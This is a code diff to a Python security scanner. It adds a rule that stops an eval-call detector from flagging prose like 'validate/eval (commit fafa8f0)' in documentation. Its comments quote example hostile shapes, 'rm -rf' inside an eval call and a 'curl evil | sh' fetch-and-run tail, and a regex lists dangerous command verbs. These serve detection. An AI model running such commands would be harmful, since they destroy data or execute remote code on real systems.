@@ -2076,6 +2076,92 @@ def _is_hyphenated_compound_sudo(line: str, match: str, rule_id: str) -> bool:
     )
 
 
+# Issue #233 — the SHELL_EXEC catalog pattern ``\beval\s*\(`` matches the tail
+# of a slash/hyphen-joined compound word followed by a PROSE parenthetical:
+# ``README validate/eval (commit fafa8f0)``. ``\b`` fires at the ``/`` -> ``e``
+# transition (the exact #136 ``no-sudo`` boundary trap) and the ``\s*\(`` then
+# matches the parenthetical commit reference, so a documentation line about
+# prior work scores a publish-blocking NIT. The compound prefix proves the
+# ``eval`` token is not a standalone call (a real invocation is never glued to
+# a preceding identifier by ``/`` or ``-``), and a prose-only parenthetical
+# proves the paren is English, not a code argument.
+#
+# FN-safety guards (each independently refuses the clear):
+#   * a quoted / backticked / $ / operator character inside the parenthetical
+#     → code payload, not prose (``validate/eval("rm -rf " + t)`` stays live);
+#   * shell metacharacters AFTER the parenthetical → a co-located real threat
+#     on the same line stays live (``… (commit x) && curl evil | sh``);
+#   * a dangerous verb inside the parenthetical itself (rm/curl/wget/sh/bash)
+#     → even without quotes it is a command shape, not prose;
+#   * fenced context is handled by the caller — this helper is only consulted
+#     on the prose path, so a ```bash fence with a real path invocation
+#     (``path/eval $INPUT``) never reaches it.
+# re2-safe: plain char classes and finditer loops, no lookaround.
+_COMPOUND_GLUED_TAIL_RE: Final[re.Pattern[str]] = re.compile(r"\w[-/]$")
+_COMPOUND_PAREN_CONTENT_RE: Final[re.Pattern[str]] = re.compile(r"[\w\s.,()#-]+")
+_COMPOUND_PAREN_DANGEROUS_RE: Final[re.Pattern[str]] = re.compile(
+    r"""["`$;|&><]|\$\(|\brm\b|\bcurl\b|\bwget\b|\bsh\b|\bbash\b|\bpython\b"""
+    r"""|\bnode\b|\bpowershell\b|\bosascript\b|\bchmod\b|\bmkfs\b|\bdd\b"""
+    r"""|\bkill\b|\bexec\b|\beval\b""",
+    re.IGNORECASE,
+)
+# A flag token inside the parenthetical is command syntax, never prose
+# (review R3): `python -c`, `--help`, `-rf`.
+_COMPOUND_PAREN_FLAG_RE: Final[re.Pattern[str]] = re.compile(r"\s-{1,2}[A-Za-z]")
+# Review R1: the tail after the parenthetical must not open a quoted string —
+# a quoted payload there is the FN shape the first cut missed.
+_COMPOUND_TAIL_METACHAR_RE: Final[re.Pattern[str]] = re.compile(r"""["'`;|&<>]|\$\(|&&|\|\|""")
+# Mirror of the catalog's SHELL_EXEC eval-call pattern (case-insensitive, like
+# the compiled catalog). Enumerating every occurrence enables the #136
+# all-occurrences discipline instead of analyzing only line.find()'s first hit.
+_EVAL_CALL_SHAPE_RE: Final[re.Pattern[str]] = re.compile(r"\beval\s*\(", re.IGNORECASE)
+
+
+def _occurrence_is_inert_prose(line: str, m: re.Match[str]) -> bool:
+    """R1 helper — the guards for ONE ``eval (`` occurrence. A clear requires
+    EVERY occurrence on the line to pass (the first cut analyzed only
+    ``line.find(match)``'s first hit, which cleared a real second call)."""
+    start = m.start()
+    if start < 2 or _COMPOUND_GLUED_TAIL_RE.fullmatch(line[start - 2 : start]) is None:
+        return False
+    rest = line[m.end() :]
+    close = rest.find(")")
+    if close < 0:
+        return False  # unbalanced paren — not a clean prose parenthetical
+    content = rest[:close]
+    if _COMPOUND_PAREN_CONTENT_RE.fullmatch(content) is None:
+        return False  # quote / $ / backtick / operator inside → code, not prose
+    if _COMPOUND_PAREN_DANGEROUS_RE.search(content):
+        return False  # a command verb in the parenthetical — refuse the clear
+    if _COMPOUND_PAREN_FLAG_RE.search(content):
+        return False  # a command flag (`-c`, `--help`) — command syntax
+    if _COMPOUND_TAIL_METACHAR_RE.search(rest[close + 1 :]):
+        return False  # co-located executable tail — refuse the clear
+    return True
+
+
+def _is_inert_compound_glued_call(line: str, match: str, rule_id: str) -> bool:
+    """#233 — True iff EVERY ``eval (`` shape on the line is a compound-word
+    tail followed by a prose parenthetical (``validate/eval (commit fafa8f0)``).
+
+    The all-occurrences discipline (review R1, mirroring #136): the match text
+    alone cannot say WHICH occurrence the dispatcher is adjudicating, so the
+    clear holds only when no occurrence anywhere on the line carries a code
+    payload, a command verb/flag, or a co-located executable tail. Every guard
+    is independently FN-refusing: see the block comment above.
+    """
+    if rule_id != "SHELL_EXEC":
+        return False
+    if "eval" not in match.lower():
+        return False
+    saw_inert = False
+    for occ in _EVAL_CALL_SHAPE_RE.finditer(line):
+        if not _occurrence_is_inert_prose(line, occ):
+            return False
+        saw_inert = True
+    return saw_inert
+
+
 # #79 — PRIVILEGE_ESC on the ubiquitous GitHub-Actions "Free disk space"
 # runner-cleanup step. A ``sudo rm -rf /usr/share/dotnet`` (and the sibling
 # pre-installed-toolchain paths) documented in a ``` ```yaml ``` GitHub
@@ -2770,6 +2856,18 @@ def _certain_benign_literal(
     #       (logical-OR fallback, e.g. `cmd || sh "$DIR/x.sh"`) as a pipe. `||`
     #       is not a pipe; a real single-pipe `cmd | sh` stays visible.
     if _is_logical_or_not_pipe(line, match, rule_id):
+        return True
+
+    # (#233) SHELL_EXEC ``eval (`` matched the tail of a compound word
+    #       (``validate/eval (commit fafa8f0)``) — the `\b` fires at the `/`-or-
+    #       `-` boundary and the parenthetical is English prose, not an argument.
+    #       PROSE PATH ONLY (``fence_state is None``): inside a fence the same
+    #       token can be a real path invocation, so the fence is never cleared.
+    if (
+        fence_state is None
+        and is_documentation_only_path(file_path)
+        and _is_inert_compound_glued_call(line, match, rule_id)
+    ):
         return True
 
     # (#79) PRIVILEGE_ESC on the GitHub-Actions free-disk-space runner-cleanup
